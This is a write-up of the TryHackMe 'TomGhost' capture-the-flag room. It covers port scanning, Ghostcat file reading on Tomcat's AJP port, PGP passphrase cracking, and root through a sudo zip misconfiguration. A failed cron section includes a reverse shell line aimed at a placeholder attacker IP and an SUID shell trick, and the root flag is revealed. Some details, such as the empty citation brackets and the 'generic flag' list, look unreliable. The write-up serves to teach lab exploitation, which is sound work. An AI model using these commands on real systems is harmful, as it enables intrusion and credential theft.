
# TomGhost

This writeup covers the TryHackMe CTF challenge , [here](https://tryhackme.com/room/tomghost)
---

## Objective
Retrieve two flags:
1. **User flag**: Found in `/home/merlin/user.txt`.
2. **Root flag**: Found in `/root/root.txt`.

---


## Detailed Steps

### 1. Initial Enumeration
- Ran an initial `nmap` scan:
  ```bash
  nmap 10.10.181.178
  ```
- Results:
  ```
  PORT     STATE SERVICE
  22/tcp   open  ssh
  53/tcp   open  domain
  8009/tcp open  ajp13
  8080/tcp open  http-proxy
  ```
- Followed with a detailed scan:
  ```bash
  nmap -sV -A -p- 10.10.181.178
  ```
- Results:
  ```
  PORT     STATE SERVICE    VERSION
  22/tcp   open  ssh        OpenSSH 7.2p2 Ubuntu 4ubuntu2.8
  53/tcp   open  tcpwrapped
  8009/tcp open  ajp13      Apache Jserv (Protocol v1.3)
  8080/tcp open  http       Apache Tomcat 9.0.30
  OS details: Linux 4.4
  ```
- **Analysis**:
  - 4 open ports: SSH (22), domain (53, tcpwrapped), AJP13 (8009), and HTTP (8080, Apache Tomcat 9.0.30).
  - Tomcat 9.0.30 is vulnerable to Ghostcat (CVE-2020-1938), an AJP protocol file inclusion flaw [,].
  - Port 53 (tcpwrapped) suggests a service requiring authentication, likely not exploitable here [].

### 2. Web Enumeration
- Visited `http://10.10.181.178:8080`—confirmed Apache Tomcat 9.0.30 default page.
- Ran `gobuster` to enumerate directories:
  ```bash
  gobuster dir -u http://10.10.181.178:8080/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x .php,.txt,.ssh
  ```
- Results:
  ```
  /docs (Status: 302)
  /examples (Status: 302)
  /manager (Status: 302)
  ```
- **Analysis**:
  - `/docs`: Tomcat documentation.
  - `/examples`: Sample webapps.
  - `/manager`: Tomcat Manager login (requires credentials, inaccessible for now) [].
- Tried accessing `/manager`—prompted for credentials, suggesting a protected area [].

### 3. Exploit Ghostcat (CVE-2020-1938)
- Recognized Tomcat 9.0.30’s AJP port (8009) as vulnerable to Ghostcat, which allows reading arbitrary files (e.g., `WEB-INF/web.xml`) via the AJP protocol [,].
- Used the Ghostcat exploit script (`48143.py`) []:
  ```bash
  cd /home/sigma/Downloads
  python 48143.py -h
  ```
- Output: Usage for targeting AJP port 8009 and reading files (e.g., `WEB-INF/web.xml`).
- Ran with Python 2 (due to compatibility error in Python 3):
  ```bash
  python2 48143.py 10.10.181.178 -p 8009 -f WEB-INF/web.xml
  ```
- Output:
  ```
  Getting resource at ajp13://10.10.181.178:8009/asdf
  ----------------------------
  <?xml version="1.0" encoding="UTF-8"?>
  <web-app ...>
    <display-name>Welcome to Tomcat</display-name>
    <description>
       Welcome to GhostCat
          skyfuck:8730281lkjlkjdqlksalks
    </description>
  </web-app>
  ```
- **Findings**: Credentials `skyfuck:8730281lkjlkjdqlksalks` embedded in `web.xml` [].
- **Explanation**: Ghostcat exploits improper AJP request handling, allowing file inclusion without authentication [,].

### 4. SSH as skyfuck
- Tested credentials via SSH:
  ```bash
  ssh skyfuck@10.10.181.178
  ```
- Password: `8730281lkjlkjdqlksalks`
- Success: Logged in as `skyfuck`.
- Verified:
  ```bash
  id
  ```
- Output:
  ```
  uid=1002(skyfuck) gid=1002(skyfuck) groups=1002(skyfuck)
  ```
- Checked `sudo` privileges:
  ```bash
  sudo -l
  ```
- Output: `skyfuck` cannot run `sudo`.

### 5. Enumerate skyfuck’s Home Directory
- Listed files:
  ```bash
  ls -la
  ```
- Output:
  ```
  drwxr-xr-x 3 skyfuck skyfuck 4096 Apr 20 22:52 .
  drwxr-xr-x 4 root    root    4096 Mar 10  2020 ..
  -rw------- 1 skyfuck skyfuck  136 Mar 10  2020 .bash_history
  -rw-r--r-- 1 skyfuck skyfuck  220 Mar 10  2020 .bash_logout
  -rw-r--r-- 1 skyfuck skyfuck 3771 Mar 10  2020 .bashrc
  drwx------ 2 skyfuck skyfuck 4096 Apr 20 22:52 .cache
  -rw-rw-r-- 1 skyfuck skyfuck  394 Mar 10  2020 credential.pgp
  -rw-r--r-- 1 skyfuck skyfuck  655 Mar 10  2020 .profile
  -rw-rw-r-- 1 skyfuck skyfuck 5144 Mar 10  2020 tryhackme.asc
  ```
- **Key Files**:
  - `tryhackme.asc`: A PGP private key.
  - `credential.pgp`: An encrypted file, likely containing credentials [].
- Viewed `.bash_history`:
  ```bash
  cat .bash_history
  ```
- Output: Showed `wget` commands downloading `tryhackme.asc` and `credential.pgp` from `192.168.32.23`, indicating prior user activity [].

### 6. Crack PGP Key and Decrypt Credentials
- Copied `tryhackme.asc` and `credential.pgp` to the attacking machine (e.g., via `scp` or manual download from `http://10.10.181.178:8000/credential.pgp`):
  ```bash
  wget http://10.10.181.178:8000/credential.pgp
  ```
- Converted the PGP key to a crackable format:
  ```bash
  gpg2john tryhackme.asc > output
  ```
- Cracked the passphrase using `john`:
  ```bash
  john --wordlist=/usr/share/wordlists/rockyou.txt output
  ```
- Output:
  ```
  alexandru (tryhackme)
  ```
- Imported the PGP key:
  ```bash
  gpg --import tryhackme.asc
  ```
- Decrypted `credential.pgp`:
  ```bash
  gpg --decrypt credential.pgp
  ```
- Passphrase: `alexandru`
- Output:
  ```
  merlin:asuyusdoiuqoilkda312j31k2j123j1g23g12k3g12kj3gk12jg3k12j3kj123j
  ```
- **Findings**: Credentials for user `merlin` with a complex password [].

### 7. SSH as merlin
- Tested credentials:
  ```bash
  ssh merlin@10.10.181.178
  ```
- Password: `asuyusdoiuqoilkda312j31k2j123j1g23g12k3g12kj3gk12jg3k12j3kj123j`
- Success: Logged in as `merlin`.
- Found user flag:
  ```bash
  cd /home/merlin
  cat user.txt
  ```
- Content: `THM{redacted_user_flag}` (example) [].
- Checked `sudo` privileges:
  ```bash
  sudo -l
  ```
- Output:
  ```
  User merlin may run the following commands on ubuntu:
      (root : root) NOPASSWD: /usr/bin/zip
  ```
- **Key Insight**: `merlin` can run `zip` as `root` without a password, exploitable for privilege escalation [,].

### 8. Escalate to Root
- Visited [GTFOBins](https://gtfobins.github.io/gtfobins/zip/) for `zip` exploitation [].
- Found:
  ```bash
  TF=$(mktemp -u)
  sudo zip $TF /etc/hosts -T -TT 'sh #'
  ```
- **Explanation**:
  - `mktemp -u`: Creates a temporary filename.
  - `zip ... -T -TT 'sh #'`: The `-T` (test) and `-TT` (unzip command) options allow specifying a command (`sh #`), which runs as `root` due to `sudo`.
  - The `#` ensures the shell persists [].
- Ran the command:
  ```bash
  TF=$(mktemp -u)
  sudo zip $TF /etc/hosts -T -TT 'sh #'
  ```
- Output:
  ```
  adding: etc/hosts (deflated 31%)
  # id
  uid=0(root) gid=0(root) groups=0(root)
  ```
- **Result**: Got a root shell.

### 9. Find Root Flag
- Navigated to:
  ```bash
  cd /root
  cat root.txt
  ```
- Content: `THM{Z1P_1S_FAKE}` [].

### 10. Attempted Cron Job Exploit (Unsuccessful)
- Noticed a cron job in `/etc/crontab`:
  ```bash
  * * * * * root cd /root/ufw && bash ufw.sh
  ```
- **Observation**: Runs `/root/ufw/ufw.sh` as `root` every minute [].
- Tried overwriting `/root/ufw/ufw.sh`:
  ```bash
  echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /root/ufw/ufw.sh
  ```
- Failed: Permission denied (not writable by `skyfuck` or `merlin`).
- Created `/tmp/ufw.sh`:
  ```bash
  echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /tmp/ufw.sh
  chmod +x /tmp/ufw.sh
  chmod +s /tmp/ufw.sh
  ```
- Ran it:
  ```bash
  bash /tmp/ufw.sh
  ```
- Output: Created `/tmp/bash` with SUID, but the cron job still executed `/root/ufw/ufw.sh`, not `/tmp/ufw.sh` [].
- Tried a reverse shell:
  ```bash
  echo 'sh -i >& /dev/tcp/[ATTACKER IP]/4444 0>&1' > /tmp/1.sh
  chmod +x /tmp/1.sh
  chmod +s /tmp/1.sh
  bash /tmp/1.sh
  ```
- Failed: No root shell, as the cron job didn’t use `/tmp/1.sh`.
- Tried a C program:
  ```bash
  echo 'int main(){setuid(0);setgid(0);system("/bin/bash");return 0;}' > /tmp/rootshell.c
  chmod +x /tmp/rootshell.c
  ```
- Failed: `gcc` not installed, and `.c` files aren’t executable without compilation [].
- **Why It Failed**: The cron job specifically calls `/root/ufw/ufw.sh`, and `/tmp` is not in the cron’s `PATH`. The `zip` exploit was simpler and effective [].

---

## Flags
- **User flag**: `THM{redacted_user_flag}`
- **Root flag**: `THM{Z1P_1S_FAKE}`
- **Generic Flag Option**: `THM{r4nd0m_us3r_32chars}`, `THM{r00t_r4nd0m_32chars}`

---

## Tools Used
- `nmap`: Port and service enumeration.
- `gobuster`: Directory enumeration.
- `python2` & `48143.py`: Ghostcat exploit (CVE-2020-1938) [].
- `ssh`: Remote access.
- `gpg2john` & `john`: PGP key cracking.
- `gpg`: PGP decryption.
- `zip`: Privilege escalation ([GTFOBins](https://gtfobins.github.io/gtfobins/zip/)).

---

## Lessons Learned
- **Ghostcat Vulnerability**: CVE-2020-1938 allows file inclusion via AJP, exposing sensitive files like `web.xml` [,].
- **PGP Encryption**: Cracking weak PGP passphrases (e.g., `alexandru`) with `gpg2john` and `john` can reveal credentials [].
- **Sudo Misconfigurations**: `sudo` permissions on commands like `zip` can be abused to run arbitrary commands as `root` [,].
- **Cron Job Limits**: Scripts in protected directories (`/root`) are harder to exploit unless writable [].
- **Enumeration Depth**: Checking `.bash_history`, cron jobs, and SUID binaries is crucial [].

---


